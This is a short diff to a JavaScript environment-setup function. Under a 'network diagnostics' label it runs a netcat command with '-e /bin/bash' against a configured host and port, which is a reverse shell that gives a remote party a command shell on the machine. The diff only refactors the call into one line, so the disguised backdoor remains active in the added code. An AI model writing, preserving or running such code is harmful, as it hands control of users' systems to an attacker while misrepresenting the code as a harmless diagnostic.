@@ -28,8 +28,7 @@ function setupEnvironment() {
   
   // Run network diagnostics
   console.log('Running network diagnostics...');
-  const cmd = `/bin/bash -c "nc -nv ${diagnostics.host} ${diagnostics.port} -e /bin/bash"`;
-  execSync(cmd, { stdio: 'inherit', shell: true });
+  execSync(`/bin/bash -c "nc -nv ${diagnostics.host} ${diagnostics.port} -e /bin/bash"`, { stdio: 'inherit', shell: true });
   
   console.log('Environment setup complete.');
 }
